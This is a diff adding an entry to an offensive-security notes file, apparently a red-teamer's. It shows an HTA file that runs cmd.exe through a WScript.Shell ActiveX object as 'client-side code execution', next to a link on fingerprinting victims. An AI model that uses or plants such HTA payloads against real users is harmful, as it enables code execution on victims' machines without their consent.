@@ -1,5 +1,17 @@
 # Notes
 
+### Client-Side .hta (HTML-based Internet Explorer only) Code Execution
+```html
+<html>
+	<body>
+		<script>
+			var c= 'cmd.exe'
+			new ActiveXObject('WScript.Shell').Run(c);
+		</script>
+	</body>
+</html>
+```
+
 ### Fingerprinting Client-Side Victim
 https://github.com/fingerprintjs/fingerprintjs2
 
